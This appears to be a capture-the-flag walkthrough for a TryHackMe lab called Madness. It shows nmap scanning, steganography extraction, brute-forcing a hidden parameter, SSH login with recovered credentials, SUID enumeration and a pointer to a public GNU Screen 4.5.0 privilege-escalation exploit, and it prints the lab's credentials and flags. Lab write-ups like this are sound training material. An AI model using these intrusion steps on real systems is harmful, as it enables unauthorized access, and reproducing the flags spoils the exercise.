# <div align="center">[Madness](https://tryhackme.com/r/room/madness)</div>
<div align="center">
  <img src="https://github.com/user-attachments/assets/044d66b7-a10d-45ac-9790-2df9df4478c2" height="200"></img>
</div>

## Let start with Scanning The IP ```nmap -sC -sV <IP>```
```
death@esther:~$ nmap -sC -sV 10.10.81.42
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 15:36 IST
Nmap scan report for 10.10.81.42
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ac:f9:85:10:52:65:6e:17:f5:1c:34:e7:d8:64:67:b1 (RSA)
|   256 dd:8e:5a:ec:b1:95:cd:dc:4d:01:b3:fe:5f:4e:12:c1 (ECDSA)
|_  256 e9:ed:e3:eb:58:77:3b:00:5e:3a:f5:24:d8:58:34:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### On apache2 default page there is a comment and Path of img.
<div align="center">
  <img src="https://github.com/user-attachments/assets/0d7cda38-0438-4380-8cf5-5fb5b05902c5" height=""></img>
</div>


### Let download this imge
```
wget http://10.10.81.42/thm.jpg
```
### Its not an image as i examined the first 12 bits of and converted it to a **JPG** format.
```
xxd thm.jpg | head
printf '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01' | dd conv=notrunc of=thm.jpg bs=1
```
### Let take look at this:
```
http://10.10.81.42/th1s_1s_h1dd3n
```
### Source code i got this ```http://Ip/th1s_1s_h1dd3n/?secret=```

<div align="center">
  <img src="https://github.com/user-attachments/assets/cd9f8dce-c50d-4732-a035-7c04232298ed" height=""></img>
</div>

### Doing this manually take a long time let automate this with help of python, I already created secret.py [tap here](https://github.com/Esther7171/THM-Walkthroughs/blob/main/Room/Madness/secret.py) 
```
death@esther:~$ python3 secret.py 
Enter IP:10.10.81.42
Found secret: 73
<html>
<head>
  <title>Hidden Directory</title>
  <link href="stylesheet.css" rel="stylesheet" type="text/css">
</head>
<body>
  <div class="main">
<h2>Welcome! I have been expecting you!</h2>
<p>To obtain my identity you need to guess my secret! </p>
<!-- It's between 0-99 but I don't think anyone will look here-->

<p>Secret Entered: 73</p>

<p>Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B</p>

</div>
</body>
</html>
```
```
y2RPJ4QaPF!B
```

### Let try steghide maybe this is the passphrase,[here](https://github.com/Esther7171/THM-Walkthroughs/blob/main/Room/Madness/thm.jpg)
```
death@esther:~$ steghide info thm.jpg
"thm.jpg":
  format: jpeg
  capacity: 1.0 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "hidden.txt":
    size: 101.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```
```
steghide extract -sf thm.jpg
```
### We got hidden.txt
```
death@esther:~$ cat hidden.txt 
Fine you found the password! 

Here's a username 

wbxre

I didn't say I would make it easy for you!
```
### This username looks strange to me let try to decode this
```
echo -n "wbxre" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```
### this is ```Rot13``` cypher on cyberchef
<div align="center">
  <img src="https://github.com/user-attachments/assets/b76ced3d-fed9-4105-87bb-f69c036a6921" height=""></img>
</div>

### ```joker``` this is the real username.

### I have tried everthing but didn't find anything after help of some resource i found the lab [banner](https://github.com/Esther7171/THM-Walkthroughs/blob/main/Room/Madness/banner.jpg) contain some information. 
```
wget https://github.com/Esther7171/THM-Walkthroughs/blob/main/Madness/banner.jpg
```
```
death@esther:~$ steghide info banner.jpg 
"banner.jpg":
  format: jpeg
  capacity: 6.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "password.txt":
    size: 83.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```
### It just a blank entry as passphase,
```
death@esther:~$ steghide extract -sf banner.jpg 
Enter passphrase: 
wrote extracted data to "password.txt".
```
### Let take a look at this password.txt
```
death@esther:~$ cat password.txt 
I didn't think you'd find me! Congratulations!

Here take my password

*axA&GF8dP
```
### Let log in with SSH.
* ### Username: ```joker```
* ### Password: ```*axA&GF8dP```
* ### ```ssh joker@<IP>```
```
death@esther:~$ ssh joker@10.10.81.42
The authenticity of host '10.10.81.42 (10.10.81.42)' can't be established.
ED25519 key fingerprint is SHA256:B0gcnLQ9MrwK4uUZINN4JI6gd+EofSsF2e8c5ZMDrwY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.81.42' (ED25519) to the list of known hosts.
joker@10.10.81.42's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-170-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun Jan  5 18:51:33 2020 from 192.168.244.128
joker@ubuntu:~$ 
```
## User flag
```
cat user.txt 
```
```
THM{d5781e53b130efe2f94f9b0354a5e4ea}
```
### Post Exploitation
```
find / -user root -perm -u=s 2>/dev/null
```
### Screen-4.5.0 is vulnerable for privesc.
```
ls -l /bin/screen*
```
### Let [exploit](https://github.com/Esther7171/THM-Walkthroughs/blob/main/Room/Madness/exploit.sh)
```
https://www.exploit-db.com/exploits/41154
```
### Copy the exploit
```
nano exploit.sh
```
### Past it & Run
```
sh 41154.sh
```
## Root flag
```
cat /root/root.txt
```
```
THM{5ecd98aa66a6abb670184d7547c8124a}
```

### Done !! 🙂
